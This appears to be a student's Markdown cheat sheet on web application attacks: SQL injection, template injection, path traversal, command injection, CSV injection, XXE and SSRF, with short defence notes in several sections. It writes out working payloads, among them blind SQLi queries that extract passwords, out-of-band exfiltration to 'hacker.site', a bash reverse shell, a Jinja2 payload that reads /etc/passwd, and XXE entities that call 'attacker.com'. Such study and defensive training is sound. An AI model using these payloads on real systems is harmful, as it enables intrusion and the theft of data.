# General Tips

- Understand how the application is working
- Think like a software engineer
- Think of potential exploits

# SQLi

Vuln: control and data sharing the same band 

Magic Payload: '";<lol/>../--#`ls`

or 1=1 to bypass condition --> use 1=1 and 1=0 to test whether vulnerable

Union join: combine left and right queries with same number and types of columns (can reuse columns - e.g. SELECT username, password, username, password)

Confirm number of columns by injecting union select 1, 1, 1;-- etc.

Use single quote in input for '1' = '1' - acts like a delimiter

Find:

- How user input is being used
- Type of DBMS
  - sqlite3 (https://www.techonthenet.com/sqlite/sys_tables/index.php)
    - `select tbl_name, sql from sqlite_master`
    - `select name, sql from sqlite_master where type='table'`
    - Comment: `-- `
- Database schema
- Table (can guess)
- Column (can guess)

Blind SQLi

- Can't directly exfiltrate data by selecting it into a column
- Can make the database do something depending on if a condition is true
  - Boolean-based blind
    - https://www.example.com/items.php?id=1' and (select 1 from users where (select password from users where username like '%admin%' limit 0,1) like '<GUESS>%') -- 
    - `select * from users where username=' or (select substr((select password from users where username = 'specific_username'), 1, 1) = 'a')-- '`
      - See if you're able to login based on boolean condition - leak user's password
      - Can use scripting to automate leaks
  - Time-based blind
    - Sleep if first letter of the password is an 'a' etc.
    - https://www.example.com/items.php?id=1' UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;

Defence:

- Prepared statements
- Designing a login page
  - Client-side / server-side validation
  - Rate limit
  - Rename sqlite_master (security by obscurity)
  - Debug mode
  - Parameterised queries
  - Use functions - sanitise



- SQLMap - suspicious traffic - may get IP banned/rate limited
- User-Agent may be stored in the database - HTTP Header can potentially be vulnerable to SQLi as well
- Try SQLi payload on all fields - not just what a user can write into (time based blind)
- Limit extracted data to not DOS
  - `select count(*) from X;`
  - `select * from X limit 1 offset 1`
- Wildcards can help save time for limiting scope of search
- Out of Band (OOB) injection - when an attacker is unable to use the same channel to launch the attack and gather results
  - e.g. `select @@secure_file_priv; to return ""`
    - NULL -> disables import
    - "/directory" -> restricted import from the directory
    - Default NULL on MySQL 5.5.53, Default "" on MySQL <5.5.53
    - Cannot be changed at runtime. Must be set at startup.
  - `select * into outfile '//192.168.1.1/url.txt'`
  - `select * into dumpfile '//192.168.1.1/url.txt'`
  - `select load_file(concat('\\\\', version(), '.hacker.site//a.txt'))`
- Subquery - copying and pasting main query as a subquery and using union-based attacks
- Bypass WAP, extract more content, bypass typing constraints with
  - CHR()
  - CAST()
  - CONCAT()
  - XPCMDSHELL()
- Fingerprinting: `@@version` vs `Version()` vs `sqlite_version()`
- NoSQL injection - Elasticsearch injection into template

Server-side template injection

- e.g. profile page - inject into template fields in Jinja2 (test with {{ 1 + 1 }})
- Arbitrary code execution - `{{''.__class__.__mro__[1].__subclasses__()[444](['cat', '/etc/passwd'], stdout=-1).communicate()}}`

Business logic vulnerability

- Developer edge case
- e.g. images stored have the same name as image from an external resource -> what happens if you upload an image with the same name
  - may replace existing image with the same name

# Files

- https://www.example.com/getimage?image=images/default.png

- Think like the developer - open image_path - can read from any directory - local file inclusion

  - Use  /etc/passwd
  - Relative paths

- Prevent path traversal

- ```python
  # Don't do
  open(user_path, 'r')
  # Do
  UPLOAD_DIR = '/app/uploads/'
  if os.path.dirname(os.realpath(os.path.join(UPLOAD_DIR, user_path))) != UPLOAD_DIR:
    # Directory traversal detected!
    exit()
  ```

- 

# Arbitrary Code Execution

- Vuln: command + arguments

- Can chain with `&&` (only run if previous succeeds) or `||` or `;`

- May be sanitised - client-side validation can be bypassed with Burp Suite

- System - may not have enough permissions (in sandbox environment)

- ```python
  # Don't do
  os.system('ping ' + host)
  # Do
  subprocess.call(['ping', host])
  ```

- Reverse shell with netcat (nc) - TCP

  - `nc -lv 4444` listens for incoming connections on port 4444
  - Listen on attacker system, connect to it from compromised server
  - "Bash Reverse Shell" -> `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

- URL-encode with Burp Suite (convert selection -> URL-encode key characters)

# EXIF

- Stripping metadata before uploading to system, look out for
  - Personal/device details
  - Malicious script
  - Correct file extension
- `exiftool`
- 



# Server-side include





# CSV injection

- Excel formulas start with =, e.g. `=cmd|' /C notepad'!'A1'`, `1, =1+1, 3`
- Cells with dangerous characters (=, +, -, @) should be sanitised by having a single quote character (') inserted at the beginning (forced to be interpreted as string)

# Rest API related vulnerabilities

- All types of injection attacks
- Broken function and object level authorisation
- Excessive data exposure
- Rate-limiting
- Restricting insecure usage of HTTP methods
- Leaking token, caching etc
- Mass assignment
- Security misconfiguration

Insecure Direct Object Reference (IDOR) - access controls of a specific functionality or an object are not defined properly in an application

- INT vs UUIDs

# XML related vulnerabilities

External XML Entity (XXE) Attacks

- XML can use external entities, like files or system commands
  - `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
- Parser often has the ability to read any file on the server - LFI (local file inclusion)

```xml
<?xml version="1.0" encoding="ISO=8859-1"?>
<creds>
	<user>Joe Smith</user>
  <pass>1234</pass>
</creds>
<!-- may return something like "Incorrect Password for Joe Smith" -->

<?xml version="1.0" encoding="ISO=8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"?]>
<creds>
	<user>&xxe;</user>
  <pass>1234</pass>
</creds>

<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
<!ENTITY xxe SYSTEM "expect://ls" >]>
<!-- rare: expect for PHP -->
```

Developer would save uploaded XML files to system in order to know size of file

Access config file in typical web folder (depends on stack), e.g. `<!ENTITY file SYSTEM "file://///opt/trtaining_app/web/config">]>` - can leak DJANGO_SECRET_KEY from this route etc.

Document Type Definition (DTD)

Defence:

- Disable external entity processingn
- Don't use PHP
- Don't use XML

https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/

# SSRF

- Tricking web application to make request to internal system on behalf of an attacker
- Typically works on URL based input by users, e.g. Image import function from URL
- Possible to use other URLs, e.g. file://, phar://, gopher://, data:// and dict://
- Can be used to enumerate internal/external services, access unauthorised APIs
- URL parsing difficult and different depending on technology used
- Try placing URL of API you do not have access to in the input field of a URL insertion field
- If you don't know secret API's - recon (e.g. find EC2 instance, default IP addresses, elasticsearch)
  - yaml config files may contain hidden endpoints

Defence:

- Whitelisting domains
- Disable access to internal domains - firewall/network policies
- Network level restrictions
- Be aware that URL parsing is hard and could easily be bypassed - never use it as the only defence
- Block access to cloud metadata services (e.g. 169.254.169.254 for AWS)































